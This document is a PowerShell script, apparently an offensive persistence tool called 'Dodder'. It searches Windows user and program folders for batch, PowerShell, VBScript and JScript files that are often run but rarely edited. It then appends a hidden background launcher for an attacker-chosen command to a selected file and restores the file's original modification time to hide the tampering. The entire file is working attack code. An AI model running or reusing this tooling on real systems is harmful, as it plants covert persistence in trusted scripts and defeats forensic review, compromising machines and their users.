$Global:FoldersToSearch = @(
    "C:\Users\",
    "C:\Program Files\",
    "C:\Program Files (x86)\",
    "C:\ProgramData\"
)

$Global:fileExtensions = @{
    # extension = "how to run a command in a new process"
    ".cmd" = 'start /B COMMAND'
    ".bat" = 'start /B COMMAND'
    ".ps1" = 'Start-Process -WindowStyle Hidden COMMAND'
    ".vbs" = 'CreateObject("WScript.Shell").Run "COMMAND", 0, False'
    ".js"  = 'new ActiveXObject("WScript.Shell").Run("COMMAND", 0, false)'
}

$Global:Candidates = @{}
$Global:Infected = @{}
$Global:Counter = 0

function DodderHunt {
    param(
        $LastAccessTimeThreshold = (Get-Date).AddDays(-7), 
        $LastModifyTimeThreshold = (Get-Date).AddMonths(-3),
        $FolderPath = ""
    )
    if ($FolderPath -ne "") {
        $FoldersToSearch = @($FolderPath)
    }

    foreach ($Folder in $FoldersToSearch) {
        if (Test-Path $Folder) {  
            $Files = Get-ChildItem -Path $Folder -Recurse -File -ErrorAction SilentlyContinue |
            Where-Object { $fileExtensions.Keys -contains $_.Extension } |
            Where-Object { ($_.LastAccessTime -gt $LastAccessTimeThreshold) -and ($_.LastWriteTime -lt $LastModifyTimeThreshold) }

            foreach ($File in $Files) {
                $IsDuplicate = $Global:Candidates.Values | Where-Object { $_.FilePath -eq $File.FullName }
                if (-not $IsDuplicate) {
                    $Global:Candidates[$Global:Counter] = [PSCustomObject]@{
                        ID           = $Global:Counter
                        FilePath     = $File.FullName
                        LastModified = $File.LastWriteTime
                        LastAccessed = $File.LastAccessTime
                        Size         = $File.Length
                        Extension    = $File.Extension
                    }
                    $Global:Counter += 1
                }
            }
        }
        
    }
    DodderShow
}

function DodderShow {
    if ($Global:Candidates.Count -gt 0) { Write-host "==========`nCandidates`n==========" }
    $Global:Candidates.Values | Sort-Object ID | Format-Table
    if ($Global:infected.Count -gt 0) { Write-host "========`nInfected`n========" }
    $Global:infected.Values | Sort-Object ID | Format-Table
}

function DodderClearCandidates {
    $Global:Candidates.Clear()
}

function DodderInfect {
    param(
        [Parameter(Mandatory = $true)] [int] $ID,
        [Parameter(Mandatory = $true)] [string] $PersistCommand
    )
    $Script2Infect = $Global:Candidates[$ID]
    $SpawnPersistCommand = $fileExtensions[$Script2Infect.Extension].replace("COMMAND", $PersistCommand)
    Add-Content -Path $Script2Infect.FilePath -Value ""
    Add-Content -Path $Script2Infect.FilePath -Value $SpawnPersistCommand
    Get-ChildItem -Path $Script2Infect.FilePath | ForEach-Object { $_.LastWriteTime = $Script2Infect.LastModified }
    $Global:Infected[$ID] = $Script2Infect
    $Global:Infected[$ID].Size = (Get-ChildItem -Path $Script2Infect.FilePath | Select-Object -ExpandProperty Length)
    $Global:Candidates.Remove($ID)  
}

